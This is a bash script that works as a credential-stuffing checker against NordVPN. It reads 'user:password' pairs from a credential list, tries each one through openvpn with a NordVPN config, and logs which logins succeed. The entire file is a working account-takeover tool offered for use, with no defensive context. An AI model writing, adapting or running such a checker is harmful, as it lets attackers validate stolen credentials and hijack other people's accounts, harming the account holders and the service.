#!/bin/bash

cd "$(dirname "$0")"
# Colorize
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 191)
BLUE=$(tput setaf 4)
BRIGHT=$(tput bold)
NORMAL=$(tput sgr0) 

: > checklog.txt
readarray CREDS  < credlist.txt

for ((i=0; i < ${#CREDS[*]}; i++))
	do
	openvpn --config nordvpn.com.udp.ovpn --route-noexec --auth-user-pass <(echo -e "${CREDS[i]//:/\\n}") > /dev/null &
	sleep 10;
	if [[ -n $(ip tuntap) ]]
                then
                printf '%s' "Login ${GREEN}SUCCESS${NORMAL} ${CREDS[i]}"
                printf '%s' "Login SUCCESS ${CREDS[i]}" >> checklog.txt
                else
                printf '%s' "Login ${RED}FAILED${NORMAL} ${CREDS[i]}"
                printf '%s' "Login FAILED ${CREDS[i]}"  >> checklog.txt
        fi
kill 15 $(pgrep openvpn)
done

